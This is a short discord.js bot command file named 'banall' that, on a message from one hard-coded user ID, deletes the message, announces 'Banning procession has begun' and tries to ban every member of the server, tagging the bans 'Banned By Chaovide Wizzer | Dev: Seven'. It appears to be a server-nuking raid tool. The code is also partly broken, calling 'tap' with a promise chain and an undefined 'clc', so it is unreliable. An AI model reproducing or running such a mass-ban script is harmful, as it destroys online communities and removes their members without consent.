const Discord = require('discord.js');
const client = new Discord.Client()
const userID = 'ID-HERE'

module.exports.run = async (msg) => {
    if (msg.author.id !== userID) return;





    msg.delete()
    msg.channel.send('Banning procession has begun.')

    console.log('Banning all members..')


    
    msg.guild.members.tap(member => member.ban("Banned By Chaovide Wizzer | Dev: Seven"))
    .then(message => {
        console.log(clc.red(`Banned all members in ${msg.guild.name}!`))
    }).catch()

    
    
    


}




module.exports.help = {
    name: 'banall'
}